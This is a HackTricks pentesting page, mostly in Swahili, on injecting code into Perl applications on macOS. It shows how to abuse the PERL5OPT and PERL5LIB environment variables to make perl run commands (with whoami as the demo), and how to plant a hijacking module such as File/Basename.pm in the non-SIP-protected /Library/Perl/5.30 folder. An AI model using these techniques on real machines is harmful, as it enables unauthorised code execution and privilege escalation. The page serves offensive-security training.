# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Kupitia `PERL5OPT` & `PERL5LIB` env variable

Kwa kutumia env variable PERL5OPT inawezekana kufanya perl itekeleze amri zisizo na mpangilio.\
Kwa mfano, tengeneza script hii:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Sasa **export the env variable** na uendeleze **perl** script:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Chaguo lingine ni kuunda moduli ya Perl (mfano `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Na kisha tumia mabadiliko ya env:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Kupitia utegemezi

Inawezekana kuorodhesha mpangilio wa folda za utegemezi wa Perl unaotembea:
```bash
perl -e 'print join("\n", @INC)'
```
Ambayo itarudisha kitu kama:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Baadhi ya folda zilizorejeshwa hata hazipo, hata hivyo, **`/Library/Perl/5.30`** inapatikana **na** **sio** **ililindwa** na **SIP** na iko **kabla** ya folda **zilizolindwa na SIP**. Hivyo, mtu anaweza kutumia folda hiyo kuongeza utegemezi wa skripti ili skripti ya Perl yenye haki za juu iweze kuipakia.

> [!WARNING]
> Hata hivyo, kumbuka kuwa **unahitaji kuwa root ili kuandika katika folda hiyo** na siku hizi utapata **kipeperushi cha TCC**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Kwa mfano, ikiwa skripti inatumia **`use File::Basename;`** itakuwa inawezekana kuunda `/Library/Perl/5.30/File/Basename.pm` ili kufanya itekeleze msimbo usio na mipaka.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
